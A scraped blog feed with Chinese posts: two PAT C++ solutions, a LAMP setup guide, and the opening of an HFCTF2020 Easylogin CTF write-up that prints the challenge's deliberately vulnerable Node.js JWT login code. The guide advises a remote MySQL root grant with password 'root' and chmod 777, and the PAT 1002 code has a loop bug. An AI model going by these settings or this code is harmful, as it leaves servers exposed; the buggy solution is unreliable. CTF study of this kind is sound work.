id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.迪杰斯特拉算法</p><h3 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1002</title>
      <link href="/2020/07/17/pat-jia-ji-1002/"/>
      <url>/2020/07/17/pat-jia-ji-1002/</url>
      
        <content type="html"><![CDATA[<blockquote><p>自闭了，网课刚结束然后还有CTF的培训，只能自己加大训练量，这次试水也要自己努力啊！</p></blockquote><h1 id="1002-A-B-for-Polynomials-25分"><a href="#1002-A-B-for-Polynomials-25分" class="headerlink" title="1002 **A+B **for Polynomials (25分)"></a><strong>1002</strong> **A+B **for Polynomials (25分)</h1><p>This time, you are supposed to find <em>A</em>+<em>B</em> where <em>A</em> and <em>B</em> are two polynomials.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial:</p><p><em>K</em> <em>N</em>1 <em>a**N</em>1 <em>N</em>2 <em>a**N</em>2 … <em>N**K</em> <em>a<strong>N</strong>K</em></p><p>where <em>K</em> is the number of nonzero terms in the polynomial, <em>N**i</em> and <em>a<strong>N</strong>i</em> (<em>i</em>=1,2,⋯,<em>K</em>) are the exponents and coefficients, respectively. It is given that 1≤<em>K</em>≤10，0≤<em>N**K</em>&lt;⋯&lt;<em>N</em>2&lt;<em>N</em>1≤1000.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case you should output the sum of <em>A</em> and <em>B</em> in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.</p><a id="more"></a><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">2 1 2.4 0 3.22 2 1.5 1 0.5</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">3 2 1.5 1 2.9 0 3.2</code></pre><p>原题如上</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>输入：</p><p>1.输入第一个数字是有几个多项式</p><p>2.先输入多项式的幂数，然后是该幂数的系数</p><p>输出：</p><p>1.输出的第一个数字是：剩余几项幂数</p><p>2.按照幂数高低依次输出幂数和系数</p><p>3.系数要保留小数点后一位</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.因为是从0-1000，故设定数组有1001，且为浮点型</p><p>2.第一轮输入的时候按照幂数的存入系数，即a[幂数]=系数</p><p>3.第二轮输入与第一轮类似，只不过是在第一轮上进行叠加即可</p><p>4.统计剩余的项数，即只要a[幂数]！=0，则该项存在</p><p>5.依次输出幂数和项数，由于之前有输出剩余的项数，则将空格移前面</p><h3 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h3><pre class=" language-c++"><code class="language-c++">#include<iostream>using namespace std;int main()&#123;    float a[1001] = &#123;0&#125;;    int m,n;    int power;    float number;    int sum = 0;    cout.precision(1);    cout.setf(ios::fixed);    //小数点后保留一位    cin >> m;    for(int i = 1; i <= m; i++)&#123;        cin >> power >> number;        a[power] += number;    &#125;    cin >> n;    for(int i = 1; i <= n; i++)&#123;        cin >> power >> number;        a[power] += number;    &#125;    for(int i = 0; i < 1001; ++i)&#123;        if(a[i] != 0) sum++;    &#125;    cout << sum;    for(int i = sum; i >= 0; i--)&#123;        if(a[i] !=0 )&#123;            cout << " " << i << " " << a[i];        &#125;        else&#123;            continue;        &#125;    &#125;    return 0;    &#125;</code></pre><p>知识点补充：</p><blockquote><p>cout.setf(ios::fixed)——用定点格式显示浮点数；</p></blockquote><p>好的，这样菜鸡就完成了第二道甲级题</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PAT甲级1001</title>
      <link href="/2020/06/18/pat-jia-ji-1001/"/>
      <url>/2020/06/18/pat-jia-ji-1001/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：菜鸡被大佬怂恿的准备去七月考一次，所以决定每天一道题，争取不爆0，然后现在还要继续打ctf，所以只能就这样吧</p></blockquote><h1 id="1001-A-B-Format-20分"><a href="#1001-A-B-Format-20分" class="headerlink" title="1001 A+B Format (20分)"></a><strong>1001</strong> <strong>A+B Format</strong> (20分)</h1><p>Calculate <em>a</em>+<em>b</em> and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits).</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. Each case contains a pair of integers <em>a</em> and <em>b</em> where −10^6≤<em>a</em>,<em>b</em>≤10^6. The numbers are separated by a space.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, you should output the sum of <em>a</em> and <em>b</em> in one line. The sum must be written in the standard format.</p><a id="more"></a><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre class=" language-in"><code class="language-in">-1000000 9</code></pre><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre class=" language-out"><code class="language-out">-999,991</code></pre><p>原题如上</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>计算，然后输出，从最后开始，每三位用“,”隔开 ，且a与b的范围是-10^6—–10^6</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>1.分析输入：a,b正常输入，用空格分开，正常求和</p><p>2.结果要分开成空格形式，转换成字符串类型，会好处理很多</p><p>3.考虑复述的情况</p><h2 id="具体代码："><a href="#具体代码：" class="headerlink" title="具体代码："></a>具体代码：</h2><pre class=" language-c++"><code class="language-c++">#include <iostream>#include <cstring>using namespace std;int main() &#123;    int a, b;    cin >> a >> b;    string s = to_string(a + b);    int len = s.length();    for (int i = 0; i < len; i++) &#123;        cout << s[i];        if (s[i] == '-')             continue;        if ((i + 1) % 3 == len % 3 && i != len - 1)        &#123;            cout << ",";        &#125;    &#125;    return 0;&#125;</code></pre><p>具体分析：</p><p>1.输入</p><p>2.利用to_string转换成字符串</p><blockquote><p>c++之to_string()函数</p><p>函数原型：<br>string to_string (int val);<br>string to_string (long val);<br>string to_string (long long val);<br>string to_string (unsigned val);<br>string to_string (unsigned long val);<br>string to_string (unsigned long long val);<br>string to_string (float val);<br>string to_string (double val);<br>string to_string (long double val);</p><p>功能：</p><p>将数值转化为字符串。返回对应的字符串。</p></blockquote><p>3.得到字符串长度，循环输出，判断函数（1）是否为负号（2）是否是三的倍数，是则输出“,”不是则不输出且i不是最后一位</p><p>这样就完成了菜鸡的PAT的第一道甲级题</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器上搭一个LAMP环境</title>
      <link href="/2020/06/06/fu-wu-qi-shang-da-yi-ge-lamp-huan-jing/"/>
      <url>/2020/06/06/fu-wu-qi-shang-da-yi-ge-lamp-huan-jing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前那台服务器为了准备二招用的，于是现在重新用回自己的学生服务器</p><p>每次都要去网上查，直接自己写个博客记录下来吧，防止踩坑，然后避免那些博客突然消失</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一台新的服务器（我这次用的服务器是华为云的学生机）</p><p>LAMP环境：Linux+Apache+Mysql+PHP</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="一-安装Mysql"><a href="#一-安装Mysql" class="headerlink" title="一.安装Mysql"></a>一.安装Mysql</h3><p>连上云服务器</p><p>1.授予管理员权限</p><pre><code>sudo su</code></pre><p>2.安装mysql</p><pre><code>apt-get install mysql-server  apt-get install mysql-client  apt-get install libmysqlclient-dev</code></pre><p>均同意即可</p><p>3.安装net-tools</p><pre><code>apt install net-tools</code></pre><p>4.检测是否安装成功</p><pre><code>sudo netstat -tap | grep mysql</code></pre><p>若处于listen状态则表示安装成功</p><a id="more"></a><p>5.登录mysql</p><pre><code>mysql -u root -p </code></pre><p>接着输入密码就行，通常默认密码是root</p><p>6.查看当前数据库</p><pre><code>show databases;</code></pre><p>7.退出mysql</p><pre><code>exit;</code></pre><h3 id="二、安装Apache2"><a href="#二、安装Apache2" class="headerlink" title="二、安装Apache2"></a>二、安装Apache2</h3><p>1.安装</p><pre><code>apt-get install apache2</code></pre><p>也是均同意</p><p>2.检测安装是否成功：</p><p>在服务器上输入公网IP（自动跳转80端口）</p><p>3.修改Apache页面</p><p>（1）在/var/www/html这个文件夹下修改index.html</p><p>（2）或者重新定位至别的地方，操作如下</p><p>进入到/etc/apache2目录中</p><p>打开000-default.conf</p><p>定位到DocumentRoot /var/www/html<br>改成DocumentRoot /var/www/(此处改为自己创建的文件夹名)</p><p>然后退出到/etc/apache2/下的目录<br>进入到mods-enabled目录中</p><p>打开dir.conf文件<br>将DirectoryIndex 后面改成xxx.html(此处为你上传的HTML)</p><p>最后更改上传的html的权限为777</p><p>然后重启Apache2</p><pre><code>sudo /etc/init.d/apache2 restart</code></pre><p>一些Apache的命令：</p><p>开启Apache2</p><pre><code>sudo /etc/init.d/apache2 start </code></pre><p>关闭Apache2</p><pre><code>sudo /etc/init.d/apache2 stop </code></pre><blockquote><p>apache 的默认的一些目录<br>默认文档根目录是在 ubuntu 上的 /var/www 目录<br>配置文件是 / etc/apache2/apache2.conf<br>配置存储在的子目录在/etc/apache2 目录</p></blockquote><h3 id="三、安装PHP7-0"><a href="#三、安装PHP7-0" class="headerlink" title="三、安装PHP7.0"></a>三、安装PHP7.0</h3><pre><code>sudo apt-get install software-properties-commonsudo add-apt-repository ppa:ondrej/php &amp;&amp; sudo apt-get updatesudo apt-get -y install php7.2#安装常用扩展（建议安装）sudo apt-get -y install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2-xml  php7.2-intl php7.2-odbc php7.2-cgi</code></pre><blockquote><p>其他（按需选择）</p><p>sudo apt-get install php7.2-gd</p><p>sudo apt-get install php7.2-soap</p><p>sudo apt-get install php7.2-gmp</p><p>sudo apt-get install php7.2-pspell  </p><p>sudo apt-get install php7.2-bcmath  </p><p>sudo apt-get install php7.2-enchant  </p><p>sudo apt-get install php7.2-imap      </p><p>sudo apt-get install php7.2-ldap      </p><p>sudo apt-get install php7.2-opcache</p><p>sudo apt-get install php7.2-readline  </p><p>sudo apt-get install php7.2-sqlite3   </p><p>sudo apt-get install php7.2-xmlrpc</p><p>sudo apt-get install php7.2-bz2</p><p>sudo apt-get install php7.2-interbase</p><p>sudo apt-get install php7.2-pgsql      </p><p>sudo apt-get install php7.2-recode     </p><p>sudo apt-get install php7.2-sybase     </p><p>sudo apt-get install php7.2-xsl     </p><p>sudo apt-get install php7.2-dba </p><p>sudo apt-get install php7.2-phpdbg    </p><p>sudo apt-get install php7.2-snmp       </p><p>sudo apt-get install php7.2-tidy   </p><p>sudo apt-get install php7.2-zip</p></blockquote><h3 id="四、远程连接mysql"><a href="#四、远程连接mysql" class="headerlink" title="四、远程连接mysql"></a>四、远程连接mysql</h3><p>1.设置数据库允许外网访问</p><pre><code>mysql -u root -p</code></pre><p>输入密码</p><pre><code>use mysql;</code></pre><pre><code>select user , host from user;</code></pre><pre><code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;</code></pre><p>BY后面填写的是远程登录密码</p><p>然后刷新数据库</p><pre><code>flush privileges;</code></pre><p>接着去安全组，进入到入方向选择，</p><p>在web-service那里快速添加规则，开启mysql的3306端口</p><p>接着尝试连接，就还会收获到10038的报错</p><p>接下来：</p><pre><code>netstat -an | grep 3306</code></pre><p>看到是127.0.0.1 listen，那么要修改mysqld.cnf配置信息</p><pre><code>cd /etc/mysql/mysql.conf.d</code></pre><pre><code>vim mysqld.cnf</code></pre><p>然后把其中的bind-address = 127.0.0.1</p><p>改成</p><p>bind-address = （你自己的私网，就是你的私有ip）</p><p>然后重启mysql</p><p>使用 service 启动：<code>service mysql restart</code></p><p>mysql服务的其他命令</p><blockquote><p><strong>一、 启动</strong><br>1、使用 service 启动：service mysql start<br>2、使用 mysqld 脚本启动：/etc/inint.d/mysql start<br>3、使用 safe_mysqld 启动：safe_mysql&amp;</p><p><strong>二、停止</strong><br>1、使用 service 启动：service mysql stop<br>2、使用 mysqld 脚本启动：/etc/inint.d/mysql stop<br>3、mysqladmin shutdown</p><p><strong>三、重启</strong><br>1、使用 service 启动：service mysql restart<br>2、使用 mysqld 脚本启动：/etc/inint.d/mysql restart</p></blockquote><h3 id="五、完成"><a href="#五、完成" class="headerlink" title="五、完成"></a>五、完成</h3><p>到这里就基本完成了配置，然后按照我之前的那篇搭题的环境，用docker搭题开始啦！</p><h2 id="参考或借鉴"><a href="#参考或借鉴" class="headerlink" title="参考或借鉴"></a>参考或借鉴</h2><p><a href="https://blog.csdn.net/qq_40147863/article/details/83187917">https://blog.csdn.net/qq_40147863/article/details/83187917</a></p><p><a href="https://blog.csdn.net/Master_Kin/article/details/103494606">https://blog.csdn.net/Master_Kin/article/details/103494606</a></p><p><a href="https://www.cnblogs.com/xpwi/p/9818350.html">https://www.cnblogs.com/xpwi/p/9818350.html</a></p><p><a href="https://www.cnblogs.com/ljl1998/p/12419006.html">https://www.cnblogs.com/ljl1998/p/12419006.html</a></p><p><a href="https://www.cnblogs.com/PoetryAndYou/p/11312224.html">https://www.cnblogs.com/PoetryAndYou/p/11312224.html</a></p><blockquote><p>一壶清茶，一盘青梅，聊聊？</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 搭题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020（web）-Easylogin</title>
      <link href="/2020/05/28/hfctf2020-web-easylogin/"/>
      <url>/2020/05/28/hfctf2020-web-easylogin/</url>
      
        <content type="html"><![CDATA[<blockquote><p>终于重新搭好了博客，惊喜万分，虽然说搭了好久，但搭的越多次，速度就越快</p><p>和我一起加油吧！</p><p>本题为复现题，在虎符那场比赛里没出来几题，我果然是太菜了</p></blockquote><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>Node.js代码审计</p><p>Node.js弱类型比较</p><a id="more"></a><h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><p>1.首先进来看到的界面是：</p><p><img src="1.PNG"></p><p>2.按照常规思路就直接审计源码，看看有没有什么好看的</p><p><img src="2.PNG"></p><p>看到里面的/static/js/app.js代码写到static是直接映射到根目录的（题目是直接用注释写着）</p><p>当时比赛的时候看到koa，认为是跟koa有关的框架的漏洞，，就后面去想别的了，接着就GG</p><p>3.然后看了一下node.js框架的基本内容，直接尝试读取了其常见的主文件app.js，成功后，用同样的方式，</p><p>把上面所有的文件都扒拉下来</p><p>4.接着就是审计扒拉下来的博客，由于对js不是很熟，放弃之后</p><p>后面看了<a href="https://www.zhaoj.in/read-6512.html">赵师傅的博客</a></p><p>跟着走了一遍</p><p>重点审计controllers/api.js</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token string">'POST /api/register'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            token<span class="token punctuation">:</span> token        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token string">'POST /api/login'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> undefined <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            status        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/flag'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            flag        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/logout'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            status<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token 